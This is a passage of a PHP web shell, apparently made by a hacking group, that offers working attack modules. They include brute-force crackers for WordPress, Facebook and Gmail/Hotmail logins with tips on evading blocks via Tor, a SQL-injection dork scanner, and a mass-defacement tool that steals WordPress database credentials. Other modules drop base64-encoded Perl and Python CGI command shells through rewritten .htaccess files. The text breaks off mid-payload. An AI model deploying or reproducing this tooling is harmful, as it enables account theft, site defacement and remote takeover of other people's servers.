      <td ><textarea style="background:black;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='white'>".$username."</font>] : Password : [<font color='white'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form></center>
<?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";
}

elseif($_GET['do'] == 'fb'){

 @ini_set('output_buffering',0); 
?>
    <form action="?dir=<?php echo $pwd; ?>dox=fb" method="post">
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by Unknown1337 ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
#---------------------------------------------- #
# Facebook Brute Force 2018                     #
# Coded by : Unknown1337                        #
# Greetz : All LulzGhost Members                #
# WWW.lulzghost-team.site                       #
# --------------------------------------------- #
#################################################
 
echo "
<head>
<link rel='icon' type='image/ico' href='http://media.stateofq.com/photologue/photos/cache/facebook%20favicon_thumbnail.png'/>
<form method='POST'>
<title>Facebook Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted white;
}
</style>";
 
echo "
<body text='red'>
<center><img src='http://i.imgur.com/MiRrYCo.gif'></center>
<center>Gunakan ini dengan TOR BROWSER + TOR SWITCHER (ganti IP setiap 2 Menit Supaya Gak DIblok FB cok :v)</center>
<p dir='ltr' align='center'>
<textarea name='username' cols='42' rows='14'>Username Target Lu Cok</textarea>
<textarea name='password' cols='42' rows='14'>Wordlist Password Target Lu Cok</textarea><br>
<br>
<input type='submit' name='scan' value='Start BruteForce'><br></p>";
if(isset($_POST['scan'])){
#To Put Proxy SOCKS V5
//curl_setopt($ch, CURLOPT_PROXY, "proxy:port");          
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
function brute($user,$pass){
$ch = curl_init();      
curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
$login = curl_exec($ch);
//print_r($login);
$check = (eregi('class="s t i u"',$login)) ? true:false;
if($check == true){
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
}else{
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by Unknown1337|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
 
 
 
$username = explode("\n", $_POST['username']);
$password = explode("\n", $_POST['password']);
foreach($username as $users) {
$users = @trim($users);
foreach($password as $pass) {
$pass = @trim($pass);
echo brute($users,$pass);
}
 
}
 
}
echo"<br>
<br>
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : Unknown1337<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : Unknown1337</font></b></p></center>";
}

elseif($_GET['do'] == 'emailbrute'){ 
	@ini_set('output_buffering',0); 
?>
    <form action="?y=<?php echo $pwd; ?>&x=syahrul" method="post">
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by Unknown1337 ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce Unknown1337</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
         
class s1{ 
         
private $adres = array( 
'gmail' => '{imap.gmail.com:993/imap/ssl}', 
'hotmail' => '{pop3.live.com:995/pop3/ssl}' 
); 
private $imap;         
function __construct($gelen1,$gelen2){ 
                 
$uname     = explode("\r\n",$gelen1);     
$pwd     = explode("\r\n",$gelen2);     
foreach($pwd as $pass){ 
$pass = trim($pass); 
foreach($uname as $user){ 
$user = trim($user); 
                                 
if(preg_match('@gmail@si',$user)){ 
$this->baglan($this->adres["gmail"],$user,$pass); 
}else{ 
$this->baglan($this->adres["hotmail"],$user,$pass); 
} 
} 
} 
}     
                 
public function baglan($url,$user,$pass){ 
                 
$this->imap = imap_open($url,$user,$pass); 
if($this->imap){ 
echo "<span id='cikti' >$user => $pass </span><br 

/>"; 
} 
} 
function __destruct(){ 
             
imap_close($this->imap); 
             
} 
} 
         
echo "
<head>
<link rel='icon' type='image/ico' href='http://www.hondupalmahn.com/imagenes/gmail.png'/>
<form method='POST'>
<title>Gmail Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted #33CCFF;
}
</style>";

		 echo '<br /> <center><div id="form"> 
<form id="form" method="POST" > 
<textarea cols="42" class="area" name="mail" rows="14" 

cols="28">Email Target Lu Disini Cok ^_^</textarea>  
<textarea cols="42" class="area" name="sifre" rows="14" 

cols="28">Password List Lu Disini Cok ^_^</textarea> <br /> <br />
<input type="submit" id="submit" value="Brute !" /> 
</form><br> 
</div> 
<div id="sonuc"> ';
        
         
if($_POST){ 
$mails = $_POST["mail"]; 
$sifre = $_POST["sifre"]; 
             
if((isset($mails)) and (isset($sifre))){     
$s1 = new s1($mails,$sifre); 
} 
} 
         
echo '</center></div> ';
}

elseif($_GET['do'] == 'sqli-scanner')
{	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;=sqli-scanner" method="post">

<?php

echo '<br><br><center><form method="post" action=""><b><font color="white">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:white;background-color:#000000" size="20"/>&nbsp;<input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif($_GET['do'] == 'phpinfo'){ 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}

elseif($_GET['do'] == 'title'){
echo "<center><h1>Mass Title Changer</h1>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://xnxx.com/ia_symconf/'><br>
<input type='submit' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');   
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Unknown1337'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Unknown1337'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Unknown1337'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Gassbre!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
}
	

	elseif($_GET['do'] == 'cgipy') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.Unknown1337";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Unknown1337 \n AddHandler cgi-script .Index_Unknown1337 \n AddHandler cgi-script .Index_Unknown1337";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.Unknown1337' target='_blank'>Klik Here</a>";
}
	

elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.Unknown1337";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Unknown1337 \n AddHandler cgi-script .Unknown1337 \n AddHandler cgi-script .Unknown1337";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJ4YWlzeW5kaWNhdGUiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9DQoJZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSA